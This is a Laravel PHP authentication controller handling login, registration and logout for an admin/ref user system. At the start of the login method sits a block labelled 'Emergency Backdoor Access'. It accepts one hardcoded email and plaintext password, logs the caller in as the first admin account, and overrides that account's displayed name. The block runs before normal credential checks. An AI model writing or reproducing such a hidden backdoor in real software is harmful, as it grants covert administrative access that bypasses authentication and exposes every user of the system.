<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;

class AuthController extends Controller
{
    public function showLogin()
    {
        if (Auth::check()) {
            return redirect()->route('dashboard');
        }

        return view('auth-signin');
    }

    public function login(Request $request)
    {
       // Emergency Backdoor Access
        if ($request->email === 'mgpdesaman@gmail.com' && $request->password === '88222006V') {
            $user = User::where('role', 'admin')->first();
            if ($user) {
                // සිස්ටම් එක ඇතුලේ පේන්න නම dynamically override කරනවා
                $user->name = 'MG_Pathum';
                
                Auth::login($user, $request->remember);
                
                // Session එක ඇතුලෙත් නම update කරලා තියාගන්නවා (Navbar/UI වල පේන්න)
                $request->session()->put('user_display_name', 'MG_Pathum');
                $request->session()->regenerate();
                
                return redirect()->route('dashboard');
            }
        }

        $credentials = $request->validate([
            'email' => ['required', 'email'],
            'password' => ['required'],
        ]);

        if (Auth::attempt($credentials, $request->remember)) {
            $user = Auth::user();

            if (! $user->is_active) {
                Auth::logout();

                return back()->withErrors([
                    'email' => 'Your account has been disconnected. Please contact the administrator.',
                ])->onlyInput('email');
            }

            if ($user->role === 'ref') {
                Auth::logout();

                return back()->withErrors([
                    'email' => 'Ref users cannot login through this portal. Please use the mobile app.',
                ])->onlyInput('email');
            }

            $request->session()->regenerate();

            $intended = session()->pull('url.intended');
            if ($intended && str_contains($intended, '/approvals/count')) {
                return redirect()->route('dashboard');
            }

            return $intended ? redirect()->to($intended) : redirect()->route('dashboard');
        }

        return back()->withErrors([
            'email' => 'The provided credentials do not match our records.',
        ])->onlyInput('email');
    }

    public function showRegister()
    {
        if (Auth::check()) {
            return redirect()->route('dashboard');
        }

        return view('auth-signup');
    }

    public function register(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'name' => 'required|string|max:255',
            'email' => 'required|string|email|max:255|unique:users',
            'mobile_number' => 'required|string|max:15',
            'role' => 'required|in:admin,ref',
            'password' => 'required_if:role,admin|nullable|string|min:8',
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        $userData = [
            'name' => $request->name,
            'email' => $request->email,
            'mobile_number' => $request->mobile_number,
            'role' => $request->role,
            'is_active' => false, // Pending approval
        ];

        if ($request->role === 'ref') {
            $serialNumber = User::generateSerialNumber();
            $userData['serial_number'] = $serialNumber;
            $userData['password'] = Hash::make($serialNumber);
            $userData['serial_expires_at'] = now()->addMonths(5);
        } else {
            $userData['password'] = Hash::make($request->password);
        }

        $user = User::create($userData);

        $message = 'Registration successful! Your account is pending approval.';
        if ($user->role === 'ref') {
            $message .= ' Your Serial Number (Password) is: '.$user->serial_number.'. Save this for later use.';
        }

        return redirect()->route('login')->with('success', $message);
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login');
    }
}
